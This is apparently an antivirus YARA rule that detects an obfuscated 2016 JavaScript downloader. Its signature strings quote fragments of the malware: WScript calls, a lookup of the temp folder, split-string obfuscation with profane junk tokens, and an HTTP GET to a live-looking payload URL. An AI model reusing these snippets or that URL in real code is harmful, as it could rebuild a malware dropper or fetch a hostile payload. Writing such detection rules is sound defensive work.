rule sig_20160428_2dc7990f9ef6e98034727485701f8953 {
  meta:
    description = "datamaliciousorder - file 20160428_2dc7990f9ef6e98034727485701f8953.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7fe4908145ac865331081d72b07b31daeba5adb09ac73cd7c13653942f90759a"

  strings:
    $s1  = "function QgaQykEuoAepSspIakSch() {return ImpYelFeyJigEfdMmgHtw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function PuuWpyYzyQoaNhbXjcGhc(CxpMajHzsAfdVvhSwaMxz){ImpYelFeyJigEfdMmgHtw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PuuWpyYzyQoaNhbXjcGhc(CxpMajHzsAfdVvhSwaMxz){ImpYelFeyJigEfdMmgHtw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return QbaSwrIlgOeoBakHyzDog - OkoKfbJoyPrpVanPakSvj;};" fullword ascii
    $s5  = "function IkpXnoSgpNtnLxiPnuGaj(QbaSwrIlgOeoBakHyzDog, OkoKfbJoyPrpVanPakSvj){AdkSutZziDlwDmkZqbJmr = AdkSutZziDlwDmkZqbJmr * 1; " ascii
    $s6  = "var ImpYelFeyJigEfdMmgHtw = function WzeYwoZavIhmZxoZiuWed() {return NhxXvoXlyBhsVbxTvsKfi[WzmVtwTaiAyqZorPhyPrb](\"WScript\"+\"" ascii
    $s7  = "ZalBrpXhzTjgTnrUwqQzr[MfgQzpKmmAodZhbDwyMad](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var NhxXvoXlyBhsVbxTvsKfi = this[\"WScript\"];" fullword ascii
    $s9  = "var ImpYelFeyJigEfdMmgHtw = function WzeYwoZavIhmZxoZiuWed() {return NhxXvoXlyBhsVbxTvsKfi[WzmVtwTaiAyqZorPhyPrb](\"WScript\"+\"" ascii
    $s10 = "function QgaQykEuoAepSspIakSch() {return ImpYelFeyJigEfdMmgHtw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function RwqFbzSvgLnnAmrMsuQmh(){return DfuBueOcxRfkMhkWeaUsr + \"\";};" fullword ascii
    $s12 = "if (ZalBrpXhzTjgTnrUwqQzr[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function IkpXnoSgpNtnLxiPnuGaj(QbaSwrIlgOeoBakHyzDog, OkoKfbJoyPrpVanPakSvj){AdkSutZziDlwDmkZqbJmr = AdkSutZziDlwDmkZqbJmr * 1; " ascii
    $s14 = "XfkIxmUacCphYmnNmtRzl = true; " fullword ascii
    $s15 = "VxdBfdCxoQmuLndBaxPgj = true;" fullword ascii
    $s16 = "}while (LhmUklLkiBwsHylHiwMrf);" fullword ascii
    $s17 = "var GqpMyiEiyAzlSngHanSup = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function WafOryTizMipRmiQhgTyk()" fullword ascii
    $s19 = "function ThkCopIjxUonAskFwrBnc(){return WzmVtwTaiAyqZorPhyPrb;};" fullword ascii
    $s20 = "return IkpXnoSgpNtnLxiPnuGaj(1 == 1 ? ErnSejByfBihUtzXtqAai : 0, 1 == 1 ? AbiWzwMprQgfZnkRtoYzo : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}